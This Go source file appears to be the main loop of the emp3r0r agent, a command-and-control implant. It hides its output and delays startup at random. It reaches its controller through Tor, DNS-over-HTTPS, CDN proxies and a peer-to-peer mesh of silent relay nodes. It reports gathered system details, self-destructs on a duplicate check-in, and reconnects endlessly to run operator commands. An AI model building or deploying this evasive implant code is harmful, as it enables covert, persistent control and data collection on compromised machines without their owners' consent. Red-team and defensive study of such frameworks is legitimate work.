package main

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/handler"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/mesh"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
	"github.com/ncruces/go-dns"
)

func agent_main() {
	var err error
	defer func() {
		if r := recover(); r != nil {
			logging.Errorf("agent_main recovered from panic: %v\n%s", r, util.CallStack())
		}
	}()

	// accept env vars
	null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
	if err != nil {
		logging.Fatalf("%s: %v", os.DevNull, err)
	}
	defer null_file.Close()
	os.Stderr = null_file
	os.Stdout = null_file

	// Check if we're running as a library (CGO build)
	is_dll := IsDLL()

	// applyRuntimeConfig
	logging.Infof("Applying runtime config...")
	err = common.InitConfig()
	if err != nil {
		logging.Fatalf("ApplyRuntimeConfig: %v", err)
	}
	util.SetFileCryptoKey([]byte(common.RuntimeConfig.Password))

	if !is_dll {
		// don't be hasty
		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
	}

	if runtime.GOOS == "linux" {
		// PATH
		agentutils.InitializePath()

		// set HOME to correct value
		setupEnvironment()

		// remove *.downloading files
		cleanUpDownloadingFiles()

		if is_dll {
			logging.Infof("%d is invoked by DLL in %d",
				os.Getpid(), os.Getppid())
		}
	}

	// Construct CC address
	// if CC is behind tor, a proxy is needed
	if netutil.IsTor(def.CCAddress) {
		logging.Infof("CC is on TOR: %s", def.CCAddress)
		logging.Infof("CC is on TOR (%s), using %s as TOR proxy", def.CCAddress, common.RuntimeConfig.C2TransportProxy)
	} else if common.RuntimeConfig.UseKCP {
		// run KCP
		go c2transport.RunKCPClient() // KCP client will run when UseKCP is set
	}
	logging.Infof("CCAddress is: %s", def.CCAddress)

	// DNS
	if common.RuntimeConfig.DoHServer != "" {
		// use DoH resolver
		net.DefaultResolver, err = dns.NewDoHResolver(
			common.RuntimeConfig.DoHServer,
			dns.DoHCache(),
		)
		if err != nil {
			logging.Fatal(err)
		}
	}

	// if user wants to use CDN proxy
	upper_proxy := common.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
	if common.RuntimeConfig.CDNProxy != "" {
		logging.Infof("C2 is behind CDN, using CDNProxy %s", common.RuntimeConfig.CDNProxy)
		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
		// DoH server
		dns := "https://9.9.9.9/dns-query"
		if common.RuntimeConfig.DoHServer != "" {
			dns = common.RuntimeConfig.DoHServer
		}
		go func() {
			for !transport.IsProxyOK(cdnproxyAddr, def.CCAddress) {
				// typically you need to configure AgentProxy manually if agent doesn't have internet
				// and AgentProxy will be used for websocket connection, then replaced with 10888
				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], common.RuntimeConfig.CDNProxy, upper_proxy, dns)
				if err != nil {
					logging.Infof("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
				}
			}
		}()
		common.RuntimeConfig.C2TransportProxy = cdnproxyAddr
	}

	// ────────────────────────────────────────────────────────────────────────────
	// Mode selection: P2P mesh vs standalone
	// ────────────────────────────────────────────────────────────────────────────
	if common.RuntimeConfig.IsP2PEnabled {
		meshCtx, meshCancel := context.WithCancel(context.Background())
		defer meshCancel()
		mesh.Start(meshCtx)

		if !common.RuntimeConfig.IsDirectC2Enabled {
			// Silent Node: never contact C2 directly.
			// WaitForRoute returns the Gateway IP once a probe KCP dial succeeds.
			logging.Infof("[*] Mesh Silent Node: waiting for a Gateway route...")
			mesh.WaitForRoute() // blocks until first gateway confirmed
			// Build the C2 HTTP client with TLS config, then override its DialContext
			// to dial a fresh DialGateway per request using the current best gateway.
			// mesh.GetGatewayIP() is re-evaluated per dial, so gateway failover is automatic.
			transport.GlobalMeshDialer = func(ctx context.Context, _, _ string) (net.Conn, error) {
				gwIP := mesh.GetGatewayIP()
				if gwIP == "" {
					return nil, fmt.Errorf("mesh: no gateway available")
				}
				return mesh.DialGateway(ctx, gwIP, mesh.OpcodeConnectC2)
			}
			def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
			if def.HTTPClient == nil {
				logging.Fatalf("Failed to create mesh C2 client")
			}
			logging.Infof("[+] Mesh route ready via gateway %s", mesh.GetGatewayIP())

			// Monitor gateway liveness. When the gateway dies, the
			// mesh.watchPeers loop closes mesh.GatewayDeadCh. We react by
			// killing the current C2 connection (so MsgTunneler returns) and
			// rebuilding the HTTP client once a new gateway is available.
			go func() {
				for {
					select {
					case <-meshCtx.Done():
						return
					case <-mesh.GatewayDeadCh:
						logging.Warningf("Mesh: gateway died, tearing down C2 connection and waiting for new route...")
						// Drop the stale HTTP client so the next dial will use
						// the new gateway chosen by watchPeers.
						def.HTTPClient = nil
						// Cancel any active C2 connection to unblock MsgTunneler.
						if def.CCMsgConn != nil {
							def.CCMsgConn.Close()
						}
						// Wait until watchPeers finds a live gateway.
						newGW := mesh.WaitForRoute()
						logging.Infof("Mesh: new gateway ready: %s, rebuilding C2 client", newGW)
						def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
						if def.HTTPClient == nil {
							logging.Errorf("Mesh: failed to rebuild C2 client via new gateway")
						}
					}
				}
			}()
		} else {
			// Gateway: also serves the relay, but contacts C2 normally.
			logging.Infof("[*] Mesh Gateway mode: relay started, connecting to C2 directly")
		}
	}

	isCheckedIn := false
connect:
	// check preset CC status URL, if CC is supposed to be offline, take a nap
	// Preflight Check
	// Preflight Check — skipped for Silent Nodes (no direct C2 path).
	isSilentNode := common.RuntimeConfig.IsP2PEnabled && !common.RuntimeConfig.IsDirectC2Enabled
	if !isSilentNode {
		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
			logging.Infof("Preflight check failed, signaling parent and sleeping")
			conditionalC2FailNotify()
			goto connect
		}
	}

	// Build C2 HTTP client. Silent Nodes already created theirs above with relay dialer.
	if !isSilentNode {
		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
		if def.HTTPClient == nil {
			logging.Infof("[-] Failed to create HTTP2 client, signaling parent and retrying")
			conditionalC2FailNotify()
			goto connect
		}
	} else if def.HTTPClient == nil {
		// Gateway died: the gateway-dead goroutine cleared def.HTTPClient and is calling
		// WaitForRoute(). Rather than polling with sleep, we call WaitForRoute() here too —
		// it uses a channel internally and returns the moment a new gateway is available.
		logging.Warningf("Mesh: HTTP client not ready, waiting for new gateway...")
		newGW := mesh.WaitForRoute()
		logging.Infof("Mesh: new gateway confirmed (%s), rebuilding C2 HTTP client", newGW)
		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
		if def.HTTPClient == nil {
			logging.Errorf("Mesh: failed to rebuild C2 client, retrying...")
			goto connect
		}
	}
	if common.RuntimeConfig.C2TransportProxy != "" {
		logging.Infof("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
	} else {
		logging.Infof("Not using proxy")
	}

	if !isCheckedIn {
		logging.Infof("Checking in on %s", def.CCAddress)
		// check in with system info
		err = c2transport.ReportStatus(common.RuntimeConfig, agentutils.GatherSystemDetails())
		if err != nil {
			if strings.Contains(err.Error(), "self-destruct") {
				logging.Fatalf("Duplicated checkin, self-destructing...")
			}
			logging.Infof("CheckIn error: %v, signaling parent and retrying", err)
			conditionalC2FailNotify()
			goto connect
		}
		logging.Infof("Checked in on CC: %s", def.CCAddress)
		isCheckedIn = true
	} else {
		logging.Infof("Already checked in, skipping registration")
	}

	// connect to the C2 msg tunnel — routing is specified in the MsgAuth CBOR envelope
	conn, ctx, cancel, err := c2transport.EstablishC2Connection(def.CCAddress, "", common.RuntimeConfig.C2Routes.Msg)
	def.CCMsgConn = conn
	if err != nil {
		logging.Infof("Connection failed: %v, signaling parent and sleeping", err)
		if strings.Contains(err.Error(), "403") || strings.Contains(err.Error(), "404") {
			logging.Warningf("Agent is not recognized by C2 (403/404), requiring re-registration")
			isCheckedIn = false
		}
		conditionalC2FailNotify()
		goto connect
	}
	logging.Infof("Connecting to message tunnel...")
	err = c2transport.MsgTunneler(def.CCMsgConn, common.RuntimeConfig, handler.HandleC2Command, ctx, cancel)
	if err != nil {
		logging.Errorf("Message tunnel exited with error: %v", err)
	}
	logging.Infof("Message tunnel closed, signaling parent and sleeping")
	// Signal parent (shellcode stager) to suspend us immediately
	// This prevents attempting reconnection that gets interrupted mid-preflight
	conditionalC2FailNotify()
	// When resumed, reconnect with fresh state
	isCheckedIn = false // reset check-in status so we do a fresh check-in
	goto connect
}

func setupEnvironment() {
	logging.Infof("setupEnvironment...")
	u, err := user.Current()
	if err != nil {
		logging.Infof("Get user info: %v", err)
	} else {
		if os.Getenv("HOME") == "" {
			os.Setenv("HOME", u.HomeDir)
		}
	}
	def.DefaultShell = "/bin/bash"
	if runtime.GOOS == "windows" {
		def.DefaultShell = "elvish"
	} else if !util.IsFileExist(def.DefaultShell) {
		def.DefaultShell = "/bin/bash"
		if !util.IsFileExist(def.DefaultShell) {
			def.DefaultShell = "/bin/sh"
		}
	}
}

func cleanUpDownloadingFiles() {
	logging.Infof("cleanUpDownloadingFiles...")
	// No more AgentRoot to clean up
}
